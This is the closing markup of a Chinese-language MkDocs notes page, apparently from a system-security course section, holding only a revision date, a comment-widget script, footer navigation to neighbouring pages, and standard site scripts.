<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
</span>
<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="2024年9月16日 00:56:42 CST">2024年9月16日 00:56:42</span>
</span>
</aside>
<script async="" crossorigin="anonymous" data-category="General" data-category-id="DIC_kwDOGnfbUc4CPrf4" data-emit-metadata="0" data-input-position="bottom" data-lang="zh-CN" data-mapping="pathname" data-reactions-enabled="1" data-repo="TonyCrane/note" data-repo-id="R_kgDOGnfbUQ" data-theme="light" src="https://giscus.app/client.js">
</script>
<script>
    if (document.querySelector("body").getAttribute("data-md-color-scheme") === "slate") {
      var giscus = document.querySelector("script[src*=giscus]")
      giscus.setAttribute("data-theme", "transparent_dark") 
    }
  </script>
</article>
</div>
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
</div>
<button class="md-top md-icon" data-md-component="top" hidden="" type="button">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
  回到页面顶部
</button>
</main>
<footer class="md-footer">
<nav aria-label="页脚" class="md-footer__inner md-grid">
<a aria-label="上一页: 系统安全 lab3" class="md-footer__link md-footer__link--prev" href="../lab3/">
<div class="md-footer__button md-icon">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
</div>
<div class="md-footer__title">
<span class="md-footer__direction">
                上一页
              </span>
<div class="md-ellipsis">
                系统安全 lab3
              </div>
</div>
</a>
<a aria-label="下一页: 无线与物联网安全基础" class="md-footer__link md-footer__link--next" href="../../iotsec/">
<div class="md-footer__title">
<span class="md-footer__direction">
                下一页
              </span>
<div class="md-ellipsis">
                无线与物联网安全基础
              </div>
</div>
<div class="md-footer__button md-icon">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"></path></svg>
</div>
</a>
</nav>
<div class="md-footer-meta md-typeset">
<div class="md-footer-meta__inner md-grid">
<div class="md-copyright">
<div class="md-copyright__highlight">
      Copyright © 2022-2026 <a href="https://github.com/TonyCrane" rel="noopener" target="_blank">TonyCrane</a>
</div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
      Material for MkDocs
    </a>
    
    modified by
    <a href="https://github.com/TonyCrane" rel="noopener" target="_blank">
      TonyCrane
    </a>
</div>
<div class="md-social">
<a class="md-social__link" href="https://github.com/TonyCrane/" rel="noopener" target="_blank" title="github.com">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
</a>
<a class="md-social__link" href="https://blog.tonycrane.cc/" rel="noopener" target="_blank" title="blog.tonycrane.cc">
<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M0 64c0-17.7 14.3-32 32-32 229.8 0 416 186.2 416 416 0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96 14.3 96 0 81.7 0 64m0 352a64 64 0 1 1 128 0 64 64 0 1 1-128 0m32-256c159.1 0 288 128.9 288 288 0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224-17.7 0-32-14.3-32-32s14.3-32 32-32"></path></svg>
</a>
<a class="md-social__link" href="https://tonycrane.cc/" rel="noopener" target="_blank" title="tonycrane.cc">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M277.8 8.6c-12.3-11.4-31.3-11.4-43.5 0l-224 208c-9.6 9-12.8 22.9-8 35.1S18.8 272 32 272h16v176c0 35.3 28.7 64 64 64h288c35.3 0 64-28.7 64-64V272h16c13.2 0 25-8.1 29.8-20.3s1.6-26.2-8-35.1zM240 320h32c26.5 0 48 21.5 48 48v96H192v-96c0-26.5 21.5-48 48-48"></path></svg>
</a>
</div>
</div>
</div>
</footer>
</div>
<div class="md-dialog" data-md-component="dialog">
<div class="md-dialog__inner md-typeset"></div>
</div>
<script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "navigation.tracking", "navigation.top", "navigation.tabs", "navigation.footer", "navigation.indexes"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
<script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
<script src="https://cdn.tonycrane.cc/utils/katex.min.js"></script>
<script src="../../../js/katex.js"></script>
<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(() => { lightbox.reload() });
</script></body>
</html>